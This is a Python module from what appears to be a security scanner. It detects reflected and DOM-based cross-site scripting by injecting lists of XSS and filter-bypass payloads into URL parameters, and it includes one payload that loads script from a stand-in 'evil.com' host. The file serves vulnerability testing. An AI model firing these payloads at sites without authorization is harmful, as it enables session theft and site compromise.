"""
asmon/modules/xss_detection.py — Cross-Site Scripting detection module.

Detection techniques:
  - Reflected XSS: Payload reflection in response body
  - DOM-based XSS: Source/sink pattern detection
  - Context-aware testing: HTML, JS, attribute contexts
  - Filter bypass: Encoding and obfuscation payloads

Focuses on reflection detection - actual exploitation requires browser context.
"""

import logging
import re
import html
import urllib.parse
from typing import Optional, List, Tuple
from hashlib import md5

from asmon.modules.base import (
    BaseModule,
    ModuleRegistry,
    Finding,
    FindingSeverity,
    FindingConfidence,
    FindingType,
)
from asmon.modules.http_utils import SecurityHTTPClient, inject_payload, get_params_from_url

logger = logging.getLogger("asmon.modules.xss")


# ---------------------------------------------------------------------------
# XSS Payloads by context
# ---------------------------------------------------------------------------

# Basic reflection probes (unique markers)
REFLECTION_PROBES = [
    "asmon{RAND}xss",
    "<asmon{RAND}>",
    "\"asmon{RAND}\"",
    "'asmon{RAND}'",
]

# HTML context payloads
HTML_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script src=//evil.com/xss.js></script>",

    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video src=x onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",

    # Anchor/iframe
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\">",

    # Object/embed
    "<object data=\"javascript:alert('XSS')\">",
    "<embed src=\"javascript:alert('XSS')\">",

    # SVG specific
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS')>",
    "<svg><set onbegin=alert('XSS')>",

    # Math ML
    "<math><maction actiontype=statusline>click<feImage xlink:href=javascript:alert('XSS')>",
]

# Attribute context payloads
ATTRIBUTE_PAYLOADS = [
    # Breaking out of attributes
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(1)'",
    "\" onfocus=\"alert('XSS')\" autofocus=\"",
    "' onfocus='alert(1)' autofocus='",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert('XSS')>",
    "'><img src=x onerror=alert(1)>",

    # Style attribute
    "\" style=\"background:url(javascript:alert('XSS'))\"",
    "expression(alert('XSS'))",
]

# JavaScript context payloads
JS_PAYLOADS = [
    # Breaking out of strings
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "';alert(1);//",
    "\";alert(1);//",
    "</script><script>alert('XSS')</script>",
    "\\';alert('XSS');//",
    "\\x27;alert(1);//",

    # Template literals
    "${alert('XSS')}",
    "`+alert('XSS')+`",
]

# Filter bypass payloads
BYPASS_PAYLOADS = [
    # Case variations
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<SCRIPT>alert('XSS')</SCRIPT>",

    # Null bytes
    "<scr\x00ipt>alert('XSS')</script>",

    # Double encoding
    "%253Cscript%253Ealert('XSS')%253C/script%253E",

    # Unicode
    "<script>alert\u0028'XSS'\u0029</script>",
    "\u003cscript\u003ealert('XSS')\u003c/script\u003e",

    # HTML entities
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;",

    # Without brackets
    "<script>alert`XSS`</script>",
    "<img src=x onerror=alert`XSS`>",

    # Concatenation
    "<script>al\\u0065rt('XSS')</script>",

    # Newlines/tabs
    "<img src=x\nonerror=alert('XSS')>",
    "<img\tsrc=x\tonerror=alert('XSS')>",

    # Comment bypass
    "<script><!--\nalert('XSS')\n--></script>",

    # SVG/foreignObject bypass
    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
]

# DOM XSS source patterns
DOM_SOURCES = [
    r"location\s*[\.\[]",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"window\.name",
    r"document\.cookie",
    r"localStorage",
    r"sessionStorage",
    r"\.hash",
    r"\.search",
    r"\.href",
]

# DOM XSS sink patterns
DOM_SINKS = [
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\([^,]*\+",
    r"setInterval\s*\([^,]*\+",
    r"Function\s*\(",
    r"\.src\s*=",
    r"\.href\s*=",
    r"\.action\s*=",
    r"location\s*=",
    r"location\.href\s*=",
    r"\.insertAdjacentHTML\s*\(",
    r"jQuery\s*\(\s*['\"][^'\"]*\+",
    r"\$\s*\(\s*['\"][^'\"]*\+",
]


@ModuleRegistry.register
class XSSDetectionModule(BaseModule):
    """Detects Cross-Site Scripting vulnerabilities."""

    name = "xss_detection"
    description = "Detects reflected, DOM-based, and filter bypass XSS vulnerabilities"
    risk_level = "high"
    requires_authorization = True

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.http = SecurityHTTPClient(
            timeout=self.timeout,
            rate_limit=self.rate_limit,
            user_agent=self.user_agent,
        )
        self.enable_html_context = True
        self.enable_attribute_context = True
        self.enable_js_context = True
        self.enable_bypass = True
        self.enable_dom_check = True
        self._probe_counter = 0

    def run(self, target: dict) -> list[Finding]:
        """
        Test URL parameters for XSS.

        Args:
            target: Dict with 'url' containing parameters to test
        """
        self.findings = []

        url = target.get("url")
        if not url:
            return self.findings

        params = get_params_from_url(url)
        if not params:
            self.logger.debug("No parameters to test in URL: %s", url)
            return self.findings

        self.logger.info("Testing %d parameters for XSS: %s", len(params), url)

        # Test each parameter
        for param in params.keys():
            self._test_parameter(url, param)

        # Check for DOM XSS patterns in baseline response
        if self.enable_dom_check:
            self._check_dom_xss(url)

        return self.findings

    def _test_parameter(self, url: str, param: str):
        """Test a single parameter for XSS."""
        self.logger.debug("Testing parameter '%s' for XSS", param)

        # First, check if parameter is reflected at all
        reflection_context = self._probe_reflection(url, param)

        if not reflection_context:
            self.logger.debug("Parameter '%s' not reflected", param)
            return

        self.logger.debug("Parameter '%s' reflected in %s context", param, reflection_context["context"])

        # Test based on context
        if reflection_context["context"] == "html":
            if self.enable_html_context:
                self._test_html_context(url, param, reflection_context)
        elif reflection_context["context"] == "attribute":
            if self.enable_attribute_context:
                self._test_attribute_context(url, param, reflection_context)
        elif reflection_context["context"] == "javascript":
            if self.enable_js_context:
                self._test_js_context(url, param, reflection_context)

        # Try bypass payloads if basic didn't work and no finding yet
        if self.enable_bypass and not any(
            f.parameter == param and f.finding_type.startswith("xss")
            for f in self.findings
        ):
            self._test_bypass_payloads(url, param)

    def _probe_reflection(self, url: str, param: str) -> Optional[dict]:
        """Probe to see if and how parameter is reflected."""
        self._probe_counter += 1
        marker = f"ASMON{self._probe_counter}XSS"

        test_url = inject_payload(url, param, marker)
        result = self.http.get(test_url)

        if not result.success or not result.response:
            return None

        body = result.response.body_preview

        if marker not in body:
            return None

        # Determine reflection context
        context = self._determine_context(body, marker)

        return {
            "marker": marker,
            "context": context,
            "body_snippet": self._extract_context_snippet(body, marker),
        }

    def _determine_context(self, body: str, marker: str) -> str:
        """Determine the HTML context where marker appears."""
        # Find position of marker
        pos = body.find(marker)
        if pos == -1:
            return "unknown"

        # Get surrounding context
        start = max(0, pos - 100)
        end = min(len(body), pos + len(marker) + 100)
        context_str = body[start:end]

        # Check if inside script tag
        if re.search(r'<script[^>]*>.*?' + re.escape(marker), context_str, re.IGNORECASE | re.DOTALL):
            return "javascript"

        # Check if inside attribute
        attr_pattern = r'[\w-]+\s*=\s*["\'][^"\']*' + re.escape(marker)
        if re.search(attr_pattern, context_str, re.IGNORECASE):
            return "attribute"

        # Check if inside HTML tag
        tag_pattern = r'<[^>]*' + re.escape(marker) + r'[^>]*>'
        if re.search(tag_pattern, context_str, re.IGNORECASE):
            return "tag"

        # Default to HTML body context
        return "html"

    def _extract_context_snippet(self, body: str, marker: str) -> str:
        """Extract snippet showing reflection context."""
        pos = body.find(marker)
        if pos == -1:
            return ""

        start = max(0, pos - 50)
        end = min(len(body), pos + len(marker) + 50)
        return body[start:end]

    def _test_html_context(self, url: str, param: str, context: dict):
        """Test payloads for HTML context."""
        for payload in HTML_PAYLOADS[:10]:  # Limit payloads for speed
            finding = self._test_payload(url, param, payload, "html")
            if finding:
                self.add_finding(finding)
                return

    def _test_attribute_context(self, url: str, param: str, context: dict):
        """Test payloads for attribute context."""
        for payload in ATTRIBUTE_PAYLOADS:
            finding = self._test_payload(url, param, payload, "attribute")
            if finding:
                self.add_finding(finding)
                return

    def _test_js_context(self, url: str, param: str, context: dict):
        """Test payloads for JavaScript context."""
        for payload in JS_PAYLOADS:
            finding = self._test_payload(url, param, payload, "javascript")
            if finding:
                self.add_finding(finding)
                return

    def _test_bypass_payloads(self, url: str, param: str):
        """Test filter bypass payloads."""
        for payload in BYPASS_PAYLOADS[:8]:  # Limit for speed
            finding = self._test_payload(url, param, payload, "bypass")
            if finding:
                self.add_finding(finding)
                return

    def _test_payload(
        self,
        url: str,
        param: str,
        payload: str,
        context: str
    ) -> Optional[Finding]:
        """Test a single XSS payload."""
        test_url = inject_payload(url, param, payload)

        result = self.http.get(test_url)
        if not result.success or not result.response:
            return None

        body = result.response.body_preview

        # Check for payload reflection
        reflected, reflection_type = self._check_reflection(body, payload)

        if reflected:
            confidence = self._determine_confidence(reflection_type, payload)

            return Finding(
                finding_id=self.generate_finding_id("xss", url, param, payload[:20]),
                finding_type=FindingType.XSS_REFLECTED.value,
                module=self.name,
                severity=FindingSeverity.HIGH.value,
                confidence=confidence,
                host=self._extract_host(url),
                url=url,
                parameter=param,
                title=f"Cross-Site Scripting (XSS) in parameter '{param}'",
                description=f"The parameter '{param}' reflects user input without proper encoding. "
                           f"Payload was reflected {reflection_type}.",
                evidence={
                    "payload": payload,
                    "parameter": param,
                    "reflection_type": reflection_type,
                    "context": context,
                    "request_url": test_url,
                    "response_code": result.response.status_code,
                    "reflected_snippet": self._extract_context_snippet(body, payload[:20]),
                },
                remediation="Encode all user input based on output context. Use Content-Security-Policy.",
                cwe_ids=["CWE-79"],
                references=["https://owasp.org/www-community/attacks/xss/"],
            )

        return None

    def _check_reflection(self, body: str, payload: str) -> Tuple[bool, str]:
        """Check if payload is reflected and how."""
        # Check exact reflection
        if payload in body:
            # Check if in script tag (highest risk)
            if re.search(r'<script[^>]*>.*?' + re.escape(payload), body, re.IGNORECASE | re.DOTALL):
                return True, "in_script_tag"

            # Check if creating event handler
            if re.search(r'on\w+\s*=\s*["\']?' + re.escape(payload[:20]), body, re.IGNORECASE):
                return True, "in_event_handler"

            # Check if in href/src
            if re.search(r'(href|src)\s*=\s*["\']?' + re.escape(payload[:20]), body, re.IGNORECASE):
                return True, "in_url_attribute"

            return True, "in_body"

        # Check HTML decoded reflection
        decoded = html.unescape(payload)
        if decoded != payload and decoded in body:
            return True, "html_decoded"

        # Check URL decoded reflection
        url_decoded = urllib.parse.unquote(payload)
        if url_decoded != payload and url_decoded in body:
            return True, "url_decoded"

        # Check partial reflection (key parts)
        key_parts = ["<script", "onerror", "onload", "alert(", "javascript:"]
        for part in key_parts:
            if part.lower() in payload.lower() and part.lower() in body.lower():
                return True, "partial_reflection"

        return False, ""

    def _determine_confidence(self, reflection_type: str, payload: str) -> str:
        """Determine confidence based on reflection type."""
        high_confidence = ["in_script_tag", "in_event_handler"]
        medium_confidence = ["in_url_attribute", "in_body"]

        if reflection_type in high_confidence:
            return FindingConfidence.HIGH.value
        elif reflection_type in medium_confidence:
            return FindingConfidence.MEDIUM.value
        else:
            return FindingConfidence.LOW.value

    def _check_dom_xss(self, url: str):
        """Check for DOM XSS patterns in response."""
        result = self.http.get(url)
        if not result.success or not result.response:
            return

        body = result.response.body_preview

        # Look for source-to-sink patterns
        sources_found = []
        sinks_found = []

        for pattern in DOM_SOURCES:
            if re.search(pattern, body, re.IGNORECASE):
                sources_found.append(pattern)

        for pattern in DOM_SINKS:
            if re.search(pattern, body, re.IGNORECASE):
                sinks_found.append(pattern)

        if sources_found and sinks_found:
            self.add_finding(Finding(
                finding_id=self.generate_finding_id("dom_xss", url),
                finding_type=FindingType.XSS_DOM.value,
                module=self.name,
                severity=FindingSeverity.MEDIUM.value,
                confidence=FindingConfidence.LOW.value,
                host=self._extract_host(url),
                url=url,
                title="Potential DOM-based XSS patterns detected",
                description="JavaScript code contains patterns that may lead to DOM-based XSS. "
                           "Manual review recommended.",
                evidence={
                    "sources": sources_found[:5],
                    "sinks": sinks_found[:5],
                },
                remediation="Review JavaScript code for unsafe DOM manipulation. Sanitize user input.",
                cwe_ids=["CWE-79"],
                false_positive_likelihood="high",
            ))

    def _extract_host(self, url: str) -> str:
        """Extract host from URL."""
        from urllib.parse import urlparse
        return urlparse(url).netloc.split(":")[0]
